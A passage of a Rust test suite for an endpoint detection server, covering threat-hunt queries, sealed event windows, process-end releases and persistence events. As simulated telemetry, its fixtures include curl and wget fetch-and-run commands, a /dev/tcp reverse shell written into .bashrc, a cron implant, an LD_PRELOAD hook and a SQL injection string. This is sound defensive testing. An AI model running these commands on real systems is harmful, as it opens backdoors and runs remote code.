    assert_eq!(count(&pool, "SELECT COUNT(*) FROM hunt_processes WHERE agent_id = ?", "hunt-clean").await, 0);

    let (status, _) = hunt(&app, None, shape).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);

    let (status, fields) = call(&app, "GET", "/api/admin/hunt/fields", Some(&reader), None).await;
    assert_eq!(status, StatusCode::OK);
    let process = fields.as_array().unwrap().iter().find(|entity| entity["name"] == "process").unwrap();
    for field in ["name", "parent.name", "parent.path", "running", "host"] {
        assert!(process["fields"].as_array().unwrap().iter().any(|listed| listed == field), "process lists {}", field);
    }
    let kinds: Vec<&str> = fields.as_array().unwrap().iter().map(|entity| entity["name"].as_str().unwrap()).collect();
    assert_eq!(kinds, ["process", "connection", "file", "detection", "persistence"]);
}

#[tokio::test]
async fn test_a_hunt_query_that_cannot_be_read_says_why_and_runs_nothing() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut host = enroll_endpoint(&app, &pool, "hunt-safe").await;
    host.deliver(&app, &dropper_chain()).await;
    let reader = admin_token("user");

    let (status, refused) = hunt(&app, Some(&reader), "process name = a").await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert_eq!(refused["error"], "Expected where after the kind of record");
    assert_eq!(refused["column"], 9);

    let (status, refused) = hunt(&app, Some(&reader), "process where parent.nam = a").await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert!(refused["error"].as_str().unwrap().contains("Fields: name, path, command"));

    let (status, refused) = hunt(&app, Some(&reader), "package where name = openssl").await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "no rule opens a package, so there is none to hunt");
    assert_eq!(refused["error"], "Start with process, connection, file, detection or persistence");

    let injection = r#"process where name = "x' OR 1=1; DELETE FROM agents; --""#;
    assert_eq!(hunt_total(&app, injection).await, 0);
    let agents: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM agents").fetch_one(&pool).await.unwrap();
    assert_eq!(agents, 1, "a value is only ever a value");
}

#[tokio::test]
async fn test_the_end_of_a_process_with_a_finding_is_opened_and_ends_its_hunt_row() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut host = enroll_endpoint(&app, &pool, "ending-host").await;
    let (nginx, shell) = nginx_and_its_shell();
    host.deliver(&app, &[nginx, shell, quiet(30)]).await;
    assert_eq!(hunt_total(&app, "process where running = true").await, 2, "the shell and its parent");

    host.deliver(&app, &[ended(40, 30), ended(41, 21), ended(42, 20), ended(43, 21)]).await;

    assert_eq!(hunt_total(&app, "process where name = sh and running = false").await, 1);
    assert_eq!(hunt_total(&app, "process where name = sh and running = true").await, 0);
    assert_eq!(hunt_total(&app, "process where name = nginx and running = true").await, 1, "the end of a process without a finding of its own stays sealed");
    assert_eq!(count(&pool, "SELECT ended_at FROM hunt_processes WHERE agent_id = ? AND pid = 21", "ending-host").await, 41);

    assert_eq!(findings(&pool, "ending-host").await.len(), 1, "the end of a process is no finding");
    assert_eq!(open_incidents(&pool, "ending-host").await, vec!["detection.server-child"]);
    let releases: Vec<(String, i64, String, i64, i64, bool)> =
        sqlx::query_as("SELECT rule, trigger_idx, context, pid, started_at, finding_event_id IS NULL FROM releases WHERE agent_id = 'ending-host' ORDER BY trigger_idx").fetch_all(&pool).await.unwrap();
    assert_eq!(releases, [("server-child".to_string(), 1, "[0]".to_string(), 21, 2, false), ("flagged-process-ended".to_string(), 4, "[1]".to_string(), 21, 2, true)]);

    let opened: Vec<i64> = sqlx::query_scalar("SELECT idx FROM sealed_events WHERE agent_id = 'ending-host' AND opened_at IS NOT NULL ORDER BY idx").fetch_all(&pool).await.unwrap();
    assert_eq!(opened, [0, 1, 4], "only the end of the shell is opened, and the event it entered with was open already");
    let stored: Vec<String> = sqlx::query_scalar("SELECT data FROM events WHERE agent_id = 'ending-host' AND event_type = 'process' ORDER BY rowid").fetch_all(&pool).await.unwrap();
    assert_eq!(stored.len(), 3);
    assert_eq!(serde_json::from_str::<serde_json::Value>(&stored[2]).unwrap(), stored_form(&ended(41, 21)));

    let (status, window) = call(&app, "GET", "/api/admin/agents/ending-host/windows/1", Some(&admin_token("user")), None).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(
        window["releases"],
        serde_json::json!([{ "trigger": 4, "rule": "flagged-process-ended", "title": "Process with a finding ended", "technique": "", "level": "info", "context": [1], "proven": false }])
    );

    let mut late = enroll_endpoint(&app, &pool, "ending-late-host").await;
    let (nginx, shell) = nginx_and_its_shell();
    let mut window = late.ledger.seal(&[nginx, shell]);
    window.releases.clear();
    assert_eq!(late.send(&app, window).await.0, StatusCode::OK);
    late.deliver(&app, &[ended(41, 21)]).await;
    let row: (String, Option<String>, i64, i64) = sqlx::query_as("SELECT name, parent_name, started_at, ended_at FROM hunt_processes WHERE agent_id = 'ending-late-host'").fetch_one(&pool).await.unwrap();
    assert_eq!(row, ("sh".to_string(), None, 2, 41), "an end that opens the process itself tells the process first and then its end");
    assert!(findings(&pool, "ending-late-host").await.is_empty() && open_incidents(&pool, "ending-late-host").await.is_empty());
}

#[tokio::test]
async fn test_a_process_with_a_finding_keeps_the_hunt_row_of_that_finding_when_it_runs_another_program() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut host = enroll_endpoint(&app, &pool, "exec-host").await;
    let (nginx, shell) = nginx_and_its_shell();
    host.deliver(&app, &[nginx, shell]).await;

    host.deliver(&app, &[became(30, 21, 20, "/usr/bin/sleep", &["25"]), ended(41, 21)]).await;

    let rows: Vec<(String, String, Option<String>, i64, Option<i64>)> =
        sqlx::query_as("SELECT name, command, parent_name, started_at, ended_at FROM hunt_processes WHERE agent_id = 'exec-host' AND pid = 21").fetch_all(&pool).await.unwrap();
    assert_eq!(
        rows,
        [("sh".to_string(), "/bin/sh -c id".to_string(), Some("nginx".to_string()), 2, Some(41))],
        "the end opens the program the shell had become, and the row a hunt searches still tells what the finding was about"
    );
    assert_eq!(hunt_total(&app, r#"process where command ~ "sh -c id" and running = false"#).await, 1);
    let stored: Vec<String> = sqlx::query_scalar("SELECT data FROM events WHERE agent_id = 'exec-host' AND event_type = 'process' ORDER BY rowid").fetch_all(&pool).await.unwrap();
    assert_eq!(stored.len(), 4, "the program it became is told as an event of its own");
    assert_eq!(serde_json::from_str::<serde_json::Value>(&stored[2]).unwrap(), stored_form(&became(30, 21, 20, "/usr/bin/sleep", &["25"])));
    assert_eq!(open_incidents(&pool, "exec-host").await, vec!["detection.server-child"]);

    let mut later = enroll_endpoint(&app, &pool, "exec-into-finding-host").await;
    later.deliver(&app, &[started(1, 20, 0, "/usr/sbin/nginx", &[]), started(2, 21, 20, "/usr/bin/env", &["true"]), started(3, 22, 21, "/bin/sh", &["-c", "curl -s http://203.0.113.9/a | sh"])]).await;
    later.deliver(&app, &[became(30, 21, 20, "/tmp/payload", &[])]).await;
    let row: (String, String, Option<String>, i64) = sqlx::query_as("SELECT name, path, parent_name, started_at FROM hunt_processes WHERE agent_id = 'exec-into-finding-host' AND pid = 21").fetch_one(&pool).await.unwrap();
    assert_eq!(row, ("payload".to_string(), "/tmp/payload".to_string(), Some("nginx".to_string()), 2), "a process first shown as a parent is rewritten by a finding of its own");
}

#[tokio::test]
async fn test_the_end_of_a_process_ends_only_its_own_hunt_row_when_the_pid_was_used_before() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut host = enroll_endpoint(&app, &pool, "reused-pid-host").await;
    let nginx = started(1, 20, 0, "/usr/sbin/nginx", &[]);
    host.deliver(&app, &[nginx.clone(), started(2, 21, 20, "/bin/sh", &["-c", "id"])]).await;

    host.restart();
    host.deliver(&app, &[nginx, started(50, 21, 20, "/bin/sh", &["-c", "whoami"]), ended(60, 21)]).await;

    let rows: Vec<(i64, String, Option<i64>)> = sqlx::query_as("SELECT started_at, command, ended_at FROM hunt_processes WHERE agent_id = 'reused-pid-host' AND pid = 21 ORDER BY started_at").fetch_all(&pool).await.unwrap();
    assert_eq!(
        rows,
        [(2, "/bin/sh -c id".to_string(), None), (50, "/bin/sh -c whoami".to_string(), Some(60))],
        "the end the endpoint released is of the later shell. Of the earlier one with the same pid no end was ever released"
    );
    assert_eq!(hunt_total(&app, "process where pid = 21 and running = false").await, 1);
    assert_eq!(hunt_total(&app, "process where pid = 21 and running = true").await, 1);
    assert_eq!(findings(&pool, "reused-pid-host").await.len(), 2, "two processes, two findings");
}

#[tokio::test]
async fn test_a_release_of_the_end_of_a_process_that_does_not_hold_is_refused() {
    let (app, pool) = create_test_app_with_pool().await;
    type Change = fn(&mut Release, &TestLedger);
    let cases: [(&str, Change); 7] = [
        ("a trigger that is not the end of a process", |release, ledger| {
            release.trigger = 2;
            release.openings[0] = ledger.opening(2);
        }),
        ("no event the process entered with", |release, _| {
            release.context.clear();
            release.openings.truncate(1);
        }),
        ("another process than its events show", |release, _| release.pid = 99),
        ("the end of another process", |release, ledger| {
            release.trigger = 4;
            release.openings[0] = ledger.opening(4);
        }),
        ("the entry of another process", |release, ledger| {
            release.context = vec![0];
            release.openings[1] = ledger.opening(0);
        }),
        ("an end where the process should enter", |release, ledger| {
            *release = Release { trigger: 4, rule: release.rule.clone(), context: vec![3], pid: 31, started_at: 31, openings: vec![ledger.opening(4), ledger.opening(3)] };
        }),
        ("a rule that finds something, on the end of a process", |release, _| release.rule = "server-child".to_string()),
    ];

    for (number, (case, change)) in cases.into_iter().enumerate() {
        let agent_id = format!("ending-release-host-{}", number);
        let mut host = enroll_endpoint(&app, &pool, &agent_id).await;
        let (nginx, shell) = nginx_and_its_shell();
        host.deliver(&app, &[nginx, shell]).await;

        let mut window = host.ledger.seal(&[quiet(31), ended(41, 21), ended(42, 31)]);
        assert_eq!(window.releases.iter().map(|release| (release.rule.as_str(), release.trigger, release.context.as_slice())).collect::<Vec<_>>(), [("flagged-process-ended", 3, [1].as_slice())]);
        change(&mut window.releases[0], &host.ledger);
        let (status, ack) = host.send(&app, window).await;
        assert_eq!(status, StatusCode::OK, "{}: the window itself is held, {}", case, ack);

        assert_eq!(open_incidents(&pool, &agent_id).await, vec!["detection.server-child", "release_invalid"], "{}", case);
        assert_eq!(count(&pool, "SELECT COUNT(*) FROM sealed_events WHERE agent_id = ? AND opened_at IS NOT NULL", &agent_id).await, 2, "{}: nothing more is opened", case);
        assert_eq!(count(&pool, "SELECT COUNT(*) FROM events WHERE agent_id = ? AND event_type = 'process'", &agent_id).await, 2, "{}", case);
        assert_eq!(count(&pool, "SELECT COUNT(*) FROM releases WHERE agent_id = ?", &agent_id).await, 1, "{}", case);
        assert_eq!(count(&pool, "SELECT COUNT(*) FROM hunt_processes WHERE agent_id = ? AND ended_at IS NOT NULL", &agent_id).await, 0, "{}: no process is taken for ended", case);
    }
}

#[tokio::test]
async fn test_a_proof_tells_whether_the_end_of_a_flagged_process_was_released() {
    let (app, pool) = create_proving_app().await;
    let (nginx, shell) = nginx_and_its_shell();

    let mut honest = enroll_endpoint(&app, &pool, "ending-told-host").await;
    honest.deliver(&app, &[nginx.clone(), shell.clone()]).await;
    honest.deliver(&app, &[quiet(30), ended(41, 21)]).await;
    let journal = honest.ledger.journal(2);
    assert_eq!(journal.matches.iter().map(|found| found.rule.id()).collect::<Vec<_>>(), ["server-child", "flagged-process-ended"]);
    assert_eq!(honest.prove(&app, &journal).await.0, StatusCode::OK);
    assert_eq!(proof_states(&pool, "ending-told-host").await, ["verified", "verified"]);
    assert_eq!(count(&pool, "SELECT COUNT(*) FROM releases WHERE agent_id = ? AND proven = 1", "ending-told-host").await, 2);
    assert_eq!(open_incidents(&pool, "ending-told-host").await, vec!["detection.server-child"]);

    let mut hiding = enroll_endpoint(&app, &pool, "ending-hidden-host").await;
    hiding.deliver(&app, &[nginx, shell]).await;
    let mut window = hiding.ledger.seal(&[quiet(30), ended(41, 21)]);
    assert_eq!(window.releases.len(), 1);
    window.releases.clear();
    assert_eq!(hiding.send(&app, window).await.0, StatusCode::OK);
    assert_eq!(count(&pool, "SELECT COUNT(*) FROM hunt_processes WHERE agent_id = ? AND pid = 21 AND ended_at IS NULL", "ending-hidden-host").await, 1, "the shell still looks alive");

    let journal = hiding.ledger.journal(2);
    assert_eq!(hiding.prove(&app, &journal).await.0, StatusCode::OK);
    assert_eq!(open_incidents(&pool, "ending-hidden-host").await, vec!["detection.server-child", "match_not_released"]);
    assert_eq!(
        incident_evidence(&pool, "ending-hidden-host", "match_not_released").await["matches"],
        serde_json::json!([{ "trigger": 3, "rule": "flagged-process-ended", "context": [1], "pid": 21, "started_at": 2 }])
    );
    assert_eq!(proof_states(&pool, "ending-hidden-host").await, ["mismatch", "mismatch"]);
    assert_eq!(findings(&pool, "ending-hidden-host").await[0]["proof"], "verified", "the finding itself is told by the proof");
}

#[tokio::test]
async fn test_hunting_reads_the_autostart_items_a_rule_released() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut host = enroll_endpoint(&app, &pool, "persistence-hunt").await;
    let cron = |action, command: &str| autostart(action, PersistenceKind::Cron, "fetch", "/etc/cron.d/fetch", command, None);
    let unit = autostart(InventoryAction::Present, PersistenceKind::SystemdUnit, "ssh.service", "/usr/lib/systemd/system/ssh.service", "/usr/sbin/sshd -D", None);
    host.deliver(&app, &[cron(InventoryAction::Added, "curl -s http://203.0.113.9/x | sh"), unit]).await;

    assert_eq!(hunt_total(&app, "persistence where kind = cron and command ~ curl and user = root").await, 1);
    assert_eq!(hunt_total(&app, "persistence where enabled = true").await, 1, "the unit no rule matched is not there to hunt");
    assert_eq!(hunt_total(&app, "persistence where kind in (systemd_unit, systemd_timer)").await, 0);

    host.deliver(&app, &[cron(InventoryAction::Changed, "wget -qO- http://203.0.113.9/y | sh")]).await;
    assert_eq!(hunt_total(&app, "persistence where kind = cron").await, 1, "a changed item is the same item");
    assert_eq!(hunt_total(&app, "persistence where command ~ wget").await, 1);

    let mut window = host.ledger.seal(&[cron(InventoryAction::Removed, "wget -qO- http://203.0.113.9/y | sh")]);
    assert!(window.releases.is_empty(), "no rule reads an item that is gone");
    window.releases.push(Release { trigger: 3, rule: "autostart-fetch".to_string(), context: Vec::new(), pid: 0, started_at: 1794780000, openings: vec![host.ledger.opening(3)] });
    assert_eq!(host.send(&app, window).await.0, StatusCode::OK);
    assert!(open_incidents(&pool, "persistence-hunt").await.contains(&"release_invalid".to_string()), "and a release that claims one did is refused");
    assert_eq!(count(&pool, "SELECT COUNT(*) FROM sealed_events WHERE agent_id = ? AND opened_at IS NOT NULL", "persistence-hunt").await, 2);
    assert_eq!(hunt_total(&app, "persistence where kind = cron").await, 1, "the removal stays sealed, so the item is listed as it was last released");
}

#[tokio::test]
async fn test_event_histogram_counts_each_type_per_bucket_and_events_can_be_cut_to_a_period() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut first = enroll_endpoint(&app, &pool, "histogram-a").await;
    let mut second = enroll_endpoint(&app, &pool, "histogram-b").await;
    let released = [
        started(1000, 10, 1, "/tmp/a", &[]),
        started(1005, 11, 1, "/tmp/b", &[]),
        started(1065, 12, 1, "/bin/sh", &[]),
        connected(1070, 12, 443),
        started(1200, 13, 1, "/tmp/d", &[]),
    ];
    first.deliver(&app, &released).await;
    second.deliver(&app, &[started(1010, 20, 1, "/tmp/e", &[]), started(1011, 21, 1, "/usr/bin/sleep", &["60"])]).await;
    let reader = admin_token("user");
    let counts = |histogram: &serde_json::Value, event_type: &str| {
        histogram["series"].as_array().unwrap().iter().find(|series| series["event_type"] == event_type).map(|series| series["counts"].clone())
    };

    let (status, everyone) = call(&app, "GET", "/api/admin/events/histogram?from=1000&to=1120&buckets=2", Some(&reader), None).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(everyone["bucket_seconds"], 60);
    assert_eq!(everyone["buckets"], 2);
    assert_eq!(counts(&everyone, "process"), Some(serde_json::json!([3, 1])));
    assert_eq!(counts(&everyone, "network"), Some(serde_json::json!([0, 1])), "a type is zero where it has nothing");

    let uri = format!("/api/admin/events/histogram?from=1000&to=1120&buckets=2&agent_id={}", first.agent.id);
    let (_, one) = call(&app, "GET", &uri, Some(&reader), None).await;
    assert_eq!(counts(&one, "process"), Some(serde_json::json!([2, 1])));

    let (_, uneven) = call(&app, "GET", "/api/admin/events/histogram?from=1000&to=1100&buckets=3", Some(&reader), None).await;
    assert_eq!(uneven["bucket_seconds"], 34, "buckets round up to whole seconds");
    assert_eq!(counts(&uneven, "process"), Some(serde_json::json!([3, 1, 0])));

    for range in ["from=1120&to=1000", "from=1000&to=1000", "from=0&to=99999999999"] {
        let (status, _) = call(&app, "GET", &format!("/api/admin/events/histogram?{}", range), Some(&reader), None).await;
        assert_eq!(status, StatusCode::BAD_REQUEST, "{}", range);
    }

    let (status, cut) = call(&app, "GET", "/api/admin/events?event_types=process&from=1060&to=1100", Some(&reader), None).await;
    assert_eq!(status, StatusCode::OK);
    let times: Vec<i64> = cut.as_array().unwrap().iter().map(|event| event["timestamp"].as_i64().unwrap()).collect();
    assert_eq!(times, vec![1065]);
}

#[tokio::test]
async fn test_event_histogram_shows_console_activity_to_admins_only() {
    let (app, _pool) = create_test_app_with_pool().await;
    let admin = admin_token("admin");
    let (status, _) = call(&app, "POST", "/api/admin/installers/generate", Some(&admin), Some(serde_json::json!({}))).await;
    assert_eq!(status, StatusCode::OK);
    let now = chrono::Utc::now().timestamp();
    let uri = format!("/api/admin/events/histogram?from={}&to={}&buckets=1", now - 60, now + 60);
    let audited = |histogram: &serde_json::Value| {
        histogram["series"].as_array().unwrap().iter().find(|series| series["event_type"] == "audit").map(|series| series["counts"][0].as_i64().unwrap())
    };

    let (_, for_admin) = call(&app, "GET", &uri, Some(&admin), None).await;
    assert_eq!(audited(&for_admin), Some(1));
    let (status, for_reader) = call(&app, "GET", &uri, Some(&admin_token("user")), None).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(audited(&for_reader), None);
}

fn persistence_event(action: &str, kind: &str, name: &str, path: &str, command: &str, hash: Option<&str>) -> serde_json::Value {
    serde_json::json!({
        "timestamp": 1794780000,
        "action": action,
        "kind": kind,
        "name": name,
        "path": path,
        "command": command,
        "user": "root",
        "enabled": true,
        "hash": hash,
    })
}

#[tokio::test]
async fn test_released_persistence_events_are_stored_with_the_fields_the_agent_sealed() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut host = enroll_endpoint(&app, &pool, "persistence-agent").await;
    let sealed = [
        autostart(InventoryAction::Present, PersistenceKind::SystemdUnit, "ssh.service", "/usr/lib/systemd/system/ssh.service", "/usr/sbin/sshd -D", Some("aa11")),
        autostart(InventoryAction::Added, PersistenceKind::Cron, "*/5 * * * * root /tmp/.x", "/etc/cron.d/implant", "/tmp/.x", Some("bb22")),
        autostart(InventoryAction::Changed, PersistenceKind::ShellProfile, ".bashrc", "/root/.bashrc", "bash -i >& /dev/tcp/203.0.113.47/443 0>&1", Some("cc33")),
        autostart(InventoryAction::Added, PersistenceKind::LdPreload, "/usr/local/lib/libhook.so", "/etc/ld.so.preload", "", None),
    ];
    host.deliver(&app, &sealed).await;

    let stored: Vec<(String, i64, String)> = sqlx::query_as("SELECT event_type, timestamp, data FROM events WHERE agent_id = ? AND event_type = 'persistence' ORDER BY rowid")
        .bind("persistence-agent")
        .fetch_all(&pool)
        .await
        .unwrap();
    let released = &sealed[1..];
    assert_eq!(stored.len(), released.len(), "the unit no rule matched stays sealed");
    for ((event_type, timestamp, data), released) in stored.iter().zip(released) {
        assert_eq!(event_type, "persistence");
        assert_eq!(*timestamp, 1794780000);
        assert_eq!(serde_json::from_str::<serde_json::Value>(data).unwrap(), stored_form(released));
    }
    assert_eq!(stored_form(&sealed[2])["kind"], "shell_profile");

    let (status, listed) = call(
        &app,
        "GET",
        "/api/admin/events?agent_id=persistence-agent&event_types=persistence",
        Some(&admin_token("user")),
        None,
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(listed.as_array().unwrap().len(), released.len(), "the console reads them through the event list");
    assert!(tables_holding(&pool, "ssh.service").await.is_empty());
}

#[tokio::test]
async fn test_persistence_event_of_an_unknown_kind_is_refused() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "persistence-unknown-kind").await;

    let body = agent.batch(serde_json::json!([
        { "Persistence": persistence_event("Added", "browser_extension", "x", "/x", "", None) }
    ]));
    let (status, _) = send_signed(&app, &agent, "/api/events", body).await;

    assert_eq!(status, StatusCode::BAD_REQUEST);
    let stored: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM events WHERE agent_id = ? AND event_type = 'persistence'")
        .bind("persistence-unknown-kind")
        .fetch_one(&pool)
        .await
        .unwrap();
    assert_eq!(stored, 0);
}

fn package_event(action: &str, manager: &str, name: &str, version: &str, previous_version: Option<&str>) -> serde_json::Value {
    serde_json::json!({
        "timestamp": 1794780000,
        "action": action,
        "manager": manager,
        "name": name,
        "version": version,
        "architecture": "amd64",
        "previous_version": previous_version,
    })
}

#[tokio::test]
async fn test_package_event_of_an_unknown_manager_is_refused() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "package-unknown-manager").await;

    let body = agent.batch(serde_json::json!([{ "Package": package_event("Added", "rpm", "openssl", "3.0.7", None) }]));
    let (status, _) = send_signed(&app, &agent, "/api/events", body).await;

    assert_eq!(status, StatusCode::BAD_REQUEST);
    let stored: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM events WHERE agent_id = ? AND event_type = 'package'")
        .bind("package-unknown-manager")
        .fetch_one(&pool)
        .await
        .unwrap();
    assert_eq!(stored, 0);
}

fn batch_of_exactly(agent: &mut TestAgent, bytes: usize) -> String {
    let install = |hostname: String| {
        serde_json::json!([{
            "Install": {
                "timestamp": 1640995200,
                "version": "0.1.0",
                "hostname": hostname,
                "platform": "linux",
                "os_version": "Debian 12",
                "architecture": "x86_64"
            }
        }])
    };

    let unpadded = agent.batch(install(String::new())).len();
    agent.seq -= 1;
    let body = agent.batch(install("x".repeat(bytes - unpadded)));
    assert_eq!(body.len(), bytes);
    body
}

#[tokio::test]
async fn test_event_batch_is_read_up_to_the_protocol_limit_and_refused_above_it() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "batch-limit-agent").await;
    let stored = || async {
        sqlx::query_scalar::<_, i64>("SELECT COUNT(*) FROM events WHERE agent_id = ? AND event_type = 'install'")
            .bind("batch-limit-agent")
            .fetch_one(&pool)
            .await
            .unwrap()
    };
    let enrolled = stored().await;

    let largest = batch_of_exactly(&mut agent, zedr_protocol::MAX_EVENT_BATCH_BYTES);
    let (status, _) = send_signed(&app, &agent, "/api/events", largest).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(stored().await, enrolled + 1);

    let too_large = batch_of_exactly(&mut agent, zedr_protocol::MAX_EVENT_BATCH_BYTES + 1);
    let (status, _) = send_signed(&app, &agent, "/api/events", too_large).await;
    assert_eq!(status, StatusCode::PAYLOAD_TOO_LARGE);
    assert_eq!(stored().await, enrolled + 1, "nothing of a refused batch is stored");

    let next = batch_of_exactly(&mut agent, 1024);
    let (status, _) = send_signed(&app, &agent, "/api/events", next).await;
    assert_eq!(status, StatusCode::OK, "a refused batch does not put the agent out of sequence");
    assert_eq!(stored().await, enrolled + 2);
}

#[tokio::test]
async fn test_sealed_windows_are_accepted_in_order_and_acknowledged_with_a_signature() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut host = enroll_endpoint(&app, &pool, "sealed-host").await;

    let first = host.deliver(&app, &[quiet(1), quiet(2)]).await;
    assert_eq!((first["window"].as_u64(), first["next_index"].as_u64()), (Some(0), Some(2)));
    let empty = host.deliver(&app, &[]).await;
    assert_eq!((empty["window"].as_u64(), empty["next_index"].as_u64()), (Some(1), Some(2)), "an empty window still moves the chain");
    let third = host.deliver(&app, &[quiet(3)]).await;
    assert_eq!((third["window"].as_u64(), third["next_index"].as_u64()), (Some(2), Some(3)));
    let head = hash_to_hex(&host.ledger.head);
    assert_eq!(third["head"], head.as_str());

    let signed_for = |agent_id: &str, window: u64| zedr_protocol::window_ack_signing_bytes(agent_id, window, 3, &head).unwrap();
    assert!(server_signed(&third, &signed_for("sealed-host", 2)));
    assert!(!server_signed(&third, &signed_for("another-host", 2)), "an acknowledgement is for one agent");
    assert!(!server_signed(&third, &signed_for("sealed-host", 3)));

    let stored: Vec<(i64, i64, i64, i64, bool, String)> = sqlx::query_as("SELECT window, epoch, first_index, count, fresh, proof FROM sealed_windows WHERE agent_id = 'sealed-host' ORDER BY window")
        .fetch_all(&pool)
        .await
        .unwrap();
    assert_eq!(stored, vec![(0, 1, 0, 2, true, "pending".to_string()), (1, 1, 2, 0, false, "pending".to_string()), (2, 1, 2, 1, false, "pending".to_string())]);
    assert_eq!(count(&pool, "SELECT COUNT(*) FROM sealed_events WHERE agent_id = ?", "sealed-host").await, 3);
    assert_eq!(count(&pool, "SELECT COUNT(*) FROM sealed_events WHERE agent_id = ? AND opened_at IS NOT NULL", "sealed-host").await, 0);
    assert_eq!(count(&pool, "SELECT COUNT(*) FROM events WHERE agent_id = ? AND event_type != 'install'", "sealed-host").await, 0, "a quiet window leaves no event behind");

    let position: (i64, i64, i64, String) = sqlx::query_as("SELECT epoch, next_window, next_index, head FROM chain_positions WHERE agent_id = 'sealed-host'").fetch_one(&pool).await.unwrap();
    assert_eq!(position, (1, 3, 3, head));
    assert!(open_incidents(&pool, "sealed-host").await.is_empty());
}

#[tokio::test]
async fn test_a_window_sent_again_is_acknowledged_identically_and_stored_once() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut host = enroll_endpoint(&app, &pool, "resending-host").await;
    host.deliver(&app, &[started(1, 20, 0, "/usr/sbin/nginx", &[])]).await;

    let window = host.ledger.seal(&[started(2, 21, 20, "/bin/sh", &["-c", "id"])]);
    let (status, ack) = host.send(&app, window.clone()).await;
    assert_eq!(status, StatusCode::OK);
    let held = || async {
        let mut rows = Vec::new();
        for table in ["sealed_windows", "sealed_events", "releases", "events", "incidents", "hunt_processes"] {
            rows.push(count(&pool, &format!("SELECT COUNT(*) FROM {} WHERE agent_id = ?", table), "resending-host").await);
        }
        rows
    };
    let before = held().await;
    assert_eq!(before, [2, 2, 1, 5, 1, 2], "two windows, the two opened events, the finding, its incident and the install");

    let (status, again) = host.send(&app, window.clone()).await;
    assert_eq!(status, StatusCode::OK, "the acknowledgement may have been lost on its way");
    assert_eq!(again, ack);
    assert_eq!(held().await, before, "a window is taken in once");

    host.deliver(&app, &[quiet(3)]).await;
    let (status, late) = host.send(&app, window).await;
    assert_eq!((status, late), (StatusCode::OK, ack), "also after the chain has moved on");
    assert_eq!(count(&pool, "SELECT next_window FROM chain_positions WHERE agent_id = ?", "resending-host").await, 3);
    assert!(!open_incidents(&pool, "resending-host").await.contains(&"chain_fork".to_string()));
}

/// Sends a window the server must refuse and checks its answer: where the stored chain stands, signed for this one request
async fn assert_refused(app: &axum::Router, pool: &SqlitePool, host: &mut Endpoint, window: SealedWindow, expected: (StatusCode, &str), position: (u64, u64, u64, &str), case: &str) {
    let stored = count(pool, "SELECT COUNT(*) FROM sealed_windows WHERE agent_id = ?", &host.agent.id).await;
    let (status, answer) = host.send(app, window).await;
    assert_eq!(status, expected.0, "{}: {}", case, answer);
    let (epoch, next_window, next_index, head) = position;
    assert_eq!(
        (answer["epoch"].as_u64(), answer["next_window"].as_u64(), answer["next_index"].as_u64(), answer["head"].as_str()),
        (Some(epoch), Some(next_window), Some(next_index), Some(head)),
        "{}",
        case
    );

    let signed_for = |seq: u64, epoch: u64| zedr_protocol::window_refusal_signing_bytes(&host.agent.id, host.agent.session, seq, epoch, next_window, next_index, head).unwrap();
    assert!(server_signed(&answer, &signed_for(host.agent.seq, epoch)), "{}: the refusal is signed with the deployment key", case);
    assert!(!server_signed(&answer, &signed_for(host.agent.seq + 1, epoch)), "{}: and is no answer to the next request", case);
    assert!(!server_signed(&answer, &signed_for(host.agent.seq - 1, epoch)), "{}: nor to the one before", case);
    assert!(!server_signed(&answer, &signed_for(host.agent.seq, epoch + 1)), "{}: the epoch is signed too", case);

    assert_eq!(open_incidents(pool, &host.agent.id).await, vec![expected.1], "{}", case);
    assert!(incident_evidence(pool, &host.agent.id, expected.1).await["reason"].as_str().is_some_and(|reason| !reason.is_empty()), "{}: the incident says why", case);
    sqlx::query("DELETE FROM incidents WHERE agent_id = ?").bind(&host.agent.id).execute(pool).await.unwrap();
    assert_eq!(count(pool, "SELECT COUNT(*) FROM sealed_windows WHERE agent_id = ?", &host.agent.id).await, stored, "{}: nothing of a refused window is stored", case);
}

#[tokio::test]
async fn test_a_window_that_does_not_continue_the_chain_is_answered_with_a_signed_refusal() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut host = enroll_endpoint(&app, &pool, "forking-host").await;
    host.deliver(&app, &[quiet(1), quiet(2)]).await;
    let before_second = host.ledger.clone();
    host.deliver(&app, &[quiet(3)]).await;
    let head = hash_to_hex(&host.ledger.head);
    let stands = (1, 2, 3, head.as_str());
    let forked_chain = (StatusCode::CONFLICT, "chain_fork");

    let mut skipping = host.ledger.clone();
    skipping.next_window += 1;
    assert_refused(&app, &pool, &mut host, skipping.seal(&[quiet(4)]), forked_chain, stands, "a gap in the window numbers").await;

    let mut forked = before_second.clone();
    assert_refused(&app, &pool, &mut host, forked.seal(&[quiet(9)]), forked_chain, stands, "another window where one is already held").await;

    let mut missing_events = host.ledger.clone();
    missing_events.next_index += 1;
    assert_refused(&app, &pool, &mut host, missing_events.seal(&[quiet(4)]), forked_chain, stands, "a gap in the event indices").await;

    let mut other_history = host.ledger.clone();
    other_history.head = [9u8; 32];
    assert_refused(&app, &pool, &mut host, other_history.seal(&[quiet(4)]), forked_chain, stands, "another previous head").await;

    let mut wrong_epoch = host.ledger.clone();
    wrong_epoch.epoch += 1;
